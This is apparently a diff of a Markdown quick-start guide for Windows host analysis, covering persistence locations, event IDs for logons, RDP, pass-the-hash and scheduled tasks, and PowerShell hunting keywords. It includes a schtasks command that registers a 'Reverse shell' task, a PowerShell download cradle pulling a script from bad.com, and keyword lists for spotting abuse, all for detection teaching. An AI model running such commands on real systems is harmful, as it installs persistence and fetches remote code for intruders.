@@ -1,6 +1,5 @@
 # Host Analysis Quick Start
 
-
 - [Host Analysis Quick Start](#host-analysis-quick-start)
 	- [Malware Persitence Locations](#malware-persitence-locations)
 		- [Common Autostart Locations (Hunting Artifact 🏹)](#common-autostart-locations-hunting-artifact-)
@@ -67,10 +66,10 @@ HKLM\SYSTEM\CurrentControlSet\Services
 
 ### Scheduled Tasks (Hunting Artifact 🏹)
 - at.exe
-	- Deprecated but present in WinXP and Win7+
-	- Recorded in at.job files and schdlgu.txt (XP)
+- Deprecated but present in WinXP and Win7+
+- Recorded in at.job files and schdlgu.txt (XP)
 - schtasks.exe
-	- Activitiy logged in Task Scheduler and Security Logs
+- Activitiy logged in Task Scheduler and Security Logs
 
 ```powershell
 schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
@@ -93,27 +92,27 @@ Common DLL Search Order
 
 ### Hunting WMI Persistence (Hunting Artifact 🏹)
 - Look at consumers (CommandLine and Active Script)
-	- Correlate to Event Filter (trigger)
+- Correlate to Event Filter (trigger)
 - Search
-	- .exe
-	- .vbs
-	- .ps1
-	- .dll
-	- .eval
-	- ActiveXObject
-	- powershell
-	- CommandLineTemplate
-	- ScriptText
+- .exe
+- .vbs
+- .ps1
+- .dll
+- .eval
+- ActiveXObject
+- powershell
+- CommandLineTemplate
+- ScriptText
 - Common WMI Occurences
-	- SCM Event Log Consumer
-	- BVTFilter
-	- TSlogonEvents.vbs
-	- TSLogonFilter
-	- RAevent.vbs
-	- RmAssistEventFilter
-	- KernCap.vbs
-	- NETEventLogConsumer
-	- WSCEAA.exe (Dell)
+- SCM Event Log Consumer
+- BVTFilter
+- TSlogonEvents.vbs
+- TSLogonFilter
+- RAevent.vbs
+- RmAssistEventFilter
+- KernCap.vbs
+- NETEventLogConsumer
+- WSCEAA.exe (Dell)
 
 
 ## Common Malware Names (Hunting Artifact 🏹)
@@ -125,10 +124,10 @@ Common DLL Search Order
 
 ### Detecting Credential Harvesting
 - Event Logs
-	- 4624 Logons
-	- 4720 Account Creation
-	- 4776 Local Account Auth
-	- 4672 Privileged Account Usage
+- 4624 Logons
+- 4720 Account Creation
+- 4776 Local Account Auth
+- 4672 Privileged Account Usage
 
 
 ## Event Logs Analysis
@@ -189,8 +188,8 @@ Common DLL Search Order
 - Useful for interactive logons (Type 2, 10, 11, 12)
 - Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
 - Admin logins generate two different sessions
-	- high privilege session
-	- lower privlege session
+- high privilege session
+- lower privlege session
 
 
 ### Brute Force Password Attack
@@ -203,25 +202,25 @@ Common DLL Search Order
 ### Built-In Accounts
 
 - SYSTEM
-	- Most powerful local account; unlimited access to system
+- Most powerful local account; unlimited access to system
 
 - LOCAL SERVICE
-	- Limited privileges similar to authenticated user account; can access only network resources via null session
+- Limited privileges similar to authenticated user account; can access only network resources via null session
 
 - NETWORK SERVICE
-	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account
+- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account
 
 - HOSTNAME$
-	- Every domain-joined windows system has a computer account
+- Every domain-joined windows system has a computer account
 
 - DWM
-	- Desktop window manager\Window manager group
+- Desktop window manager\Window manager group
 
 - UMFD
-	- Font driver host account
+- Font driver host account
 
 - ANONYMOUS LOGON
-	- Null session w/o credentials use to authenticate with resource
+- Null session w/o credentials use to authenticate with resource
 
 **Notes**  
 - Recommended to ignore in initial investigation (very noisy)
@@ -233,9 +232,9 @@ Common DLL Search Order
 - Event ID 4672
 - Usually follows Event ID 4624 (Successful Logon)
 - Important for:
-	- Account auditing
-	- Planning for password resets
-	- Identifying compromised service accounts
+- Account auditing
+- Planning for password resets
+- Identifying compromised service accounts
 - Scheduled tasks run with administrative privileges also trigger this
 
 
@@ -244,63 +243,63 @@ Common DLL Search Order
 
 - Event ID 4720
 - Complementary events include
-	- 4722: A user account was enabled
-	- 4724: An attempt was made to reset an accounts password
-	- 4728: A member was added to a security enabled global group
-	- 4732: A member was added to a security enabled local group
-	- 4735: A security enabled local group was changed
-	- 4738: A user account was changed
-	- 4756: A member was added to a security enabled universal group
+- 4722: A user account was enabled
+- 4724: An attempt was made to reset an accounts password
+- 4728: A member was added to a security enabled global group
+- 4732: A member was added to a security enabled local group
+- 4735: A security enabled local group was changed
+- 4738: A user account was changed
+- 4756: A member was added to a security enabled universal group
 
 
 
 ### Remote Desktop Activity (Hunting Artifact 🏹)
 
 - Event ID 4778 (Session Reconnected)
-	- Should see 4624 (Successful logon) simultaneously
-	- Session name contains "RDP"
-	- Client Name: True Client Hostname (regardless of hops)
+- Should see 4624 (Successful logon) simultaneously
+- Session name contains "RDP"
+- Client Name: True Client Hostname (regardless of hops)
 - Event ID 4779 (Session Disconnected)
-	- Should see 4647 (Successful logoff) simultaneously
+- Should see 4647 (Successful logoff) simultaneously
 - Not a reliable indicator of all RDP activity (records reconnects)
-	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
+- Fill in gaps with Event ID 4624 Type 3,7,10 Events
 - Logs provide IP address and hostname
 - False positive: Shared workstations (fast user switching)
-	- Session Name: Console
+- Session Name: Console
 - Source System
-	- Security
-		- 4648: Logon with alternate credentials
-			- Current logged on username
-			- Alternate user name
-			- Destination hostname/ip
-			- Process Name
-	- TerminalServices-RdpClient
-		- 1024
-			- Destination hostname
-		- 1102
-			- Destination IP
+- Security
+- 4648: Logon with alternate credentials
+- Current logged on username
+- Alternate user name
+- Destination hostname/ip
+- Process Name
+- TerminalServices-RdpClient
+- 1024
+- Destination hostname
+- 1102
+- Destination IP
 - Destination System
-	- Security
-		- 4624 Type 10
-			- Source IP/Logon Username
-		4778/4779
-			- IP address of source/source system name
-			- Logon Username
-	- Remote Desktop Services-RDPCoreTS
-		- 131 - Connection attempts
-			- Source ip/logon username
-		- 98 - Successful connections
-	- TerminalServices Remote Connection Manager
-		- 1149
-			- Source ip/logon user name
-				- Blank may indicate use of sticky keys
-	- Terminal Services LocalSession Manager
-		- 21,22,25
-			- Source IP, Logon username
-		- 41
-			- Logon Username
+- Security
+- 4624 Type 10
+- Source IP/Logon Username
+  4778/4779
+- IP address of source/source system name
+- Logon Username
+- Remote Desktop Services-RDPCoreTS
+- 131 - Connection attempts
+- Source ip/logon username
+- 98 - Successful connections
+- TerminalServices Remote Connection Manager
+- 1149
+- Source ip/logon user name
+    - Blank may indicate use of sticky keys
+- Terminal Services LocalSession Manager
+- 21,22,25
+- Source IP, Logon username
+- 41
+- Logon Username
 - 4624 Type 7
-	- Often Unlock or RDP Reconnect
+- Often Unlock or RDP Reconnect
 
 
 ### Privileged Local Account Abuse - Pass the Hash
@@ -309,10 +308,10 @@ Common DLL Search Order
 - Identify any workstations with these events
 - Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
 - Review events surrounding 4776
-	- 4624 (succesful logon)
-		- Type 3 often indicative of share mapping or exceuting code with PsExec
-	- 4672 - Privelged logon
-	- 5140 - File Share event
+- 4624 (succesful logon)
+- Type 3 often indicative of share mapping or exceuting code with PsExec
+- 4672 - Privelged logon
+- 5140 - File Share event
 
 
 
@@ -343,82 +342,82 @@ Common DLL Search Order
 
 **Detection**
 - Originating Host - Event Id 4648
-	- Subject
-		- Account Name: Intitial Account Name
-	- Account Whose Credentials Were Used
-		- Account Name: "run as" account name
-	- Target Server
-		- Target Server Name: Remote Target
+- Subject
+- Account Name: Intitial Account Name
+- Account Whose Credentials Were Used
+- Account Name: "run as" account name
+- Target Server
+- Target Server Name: Remote Target
 - Target System - Event Id 5140
-	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
-	- Source Address: Source IP of originating host
-	- Share Name: Share accessed (IPC$, etc)
-	- Computer: Computer name of remote host
+- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
+- Source Address: Source IP of originating host
+- Share Name: Share accessed (IPC$, etc)
+- Computer: Computer name of remote host
 
 **Cobalt Strike - Make Token or Pass the hash**
 
 - EventID 4624
-	- Logon Type 9 (explicit credentials)
-	- "Subject - Account Name" matches "New Logon - Account Name"
-	- Note Process information
+- Logon Type 9 (explicit credentials)
+- "Subject - Account Name" matches "New Logon - Account Name"
+- Note Process information
 
 
 
 - EventId 4648 (explicit credentials)
-	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
-	- Note Target Server Name
+- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
+- Note Target Server Name
 
 
 
 ### Lateral Movement - Scheduled Tasks
 
 - Log: Task Scheduler - Security
-	- 106 - 4698 - Task Created
-	- 140 - 4720 - Task Updated
-	- 141 - 4699 - Task Deleted
+- 106 - 4698 - Task Created
+- 140 - 4720 - Task Updated
+- 141 - 4699 - Task Deleted
 - Task Scheduler
-	- 200/201: Task Executed/Completed
+- 200/201: Task Executed/Completed
 - Security
-	- 4700/4701: Task Enabled/Disabled
+- 4700/4701: Task Enabled/Disabled
 
 **Notes**
 - Tasks can be executed locally and remotely
-	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
+- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
 - Attackers commonly delete scheduled tasks after execution
-	- Hunt deleted tasks (rare)
+- Hunt deleted tasks (rare)
 - Tasks running executables from /Temp likey evil
 
 **Task Scheduler Artifacts**
 - XML Files
 - Saved in:
-	- \Windows\System32\Tasks
-	- \Windows\SysWOW64\Tasks
+- \Windows\System32\Tasks
+- \Windows\SysWOW64\Tasks
 - Includes:
-	- Task Name
-	- Registration date and time (local)
-	- Account used to register
-	- Trigger conditions and frequency
-	- Full command path
-	- Account authenticated to run task
+- Task Name
+- Registration date and time (local)
+- Account used to register
+- Trigger conditions and frequency
+- Full command path
+- Account authenticated to run task
 
 
 
 ### Suspicious Services
 
 - Analyze logs for suspicious services running at boot time
-	- Service type changed to Boot
+- Service type changed to Boot
 - Review services started and stopped during time of a suspected hack
 
 
 
 - System Log
-	- 7034: Service Crashed Unexpectedly
-	- 7035: Service sent a Start/Stop control
-	- 7036: Service started or stopped
-	- 7040: Start typed changed (Boot, On Request, Disabled)
-	- 7045: A new service was installed on the system (Win2008R2+)
+- 7034: Service Crashed Unexpectedly
+- 7035: Service sent a Start/Stop control
+- 7036: Service started or stopped
+- 7040: Start typed changed (Boot, On Request, Disabled)
+- 7045: A new service was installed on the system (Win2008R2+)
 - Security Log
-	- 4697: A new service was installed on the system
+- 4697: A new service was installed on the system
 
 
 
@@ -465,36 +464,36 @@ Common DLL Search Order
 - EID 5857 tracks loaded provider dlls
 - EID 5858 includes hostname and username
 - Search for:
-	- CommandLine
-	- ActiveScript
-	- scrcons
-	- wbemcons
-	- powershell
-	- eval
-	- .vbs
-	- .ps1
-	- ActiveXObject
+- CommandLine
+- ActiveScript
+- scrcons
+- wbemcons
+- powershell
+- eval
+- .vbs
+- .ps1
+- ActiveXObject
 
 
 ### Quick Wins - PowerShell (Hunting Artifact 🏹)
 - PowerShell/Operational Log
-	- EID 4103 records module/pipeline output
-	- EID 4104 record code (scripts) executed (look for "Warning" events)
+- EID 4103 records module/pipeline output
+- EID 4104 record code (scripts) executed (look for "Warning" events)
 - PowerShell download cradle heavily used in the wild
-	- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
+- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
 - Filter using commonly abused keywords
-	- download
-	- IEX
-	- rundll32
-	- http
-	- Start-Process
-	- Invoke-Expression
-	- Invoke-Command
-	- syswow64
-	- FromBase64String
-	- WebClient
-	- bitstransfer
-	- Reflection
-	- powershell -version
-	- Invoke-WmiMethod
-	- Invoke-CimMethod
+- download
+- IEX
+- rundll32
+- http
+- Start-Process
+- Invoke-Expression
+- Invoke-Command
+- syswow64
+- FromBase64String
+- WebClient
+- bitstransfer
+- Reflection
+- powershell -version
+- Invoke-WmiMethod
+- Invoke-CimMethod
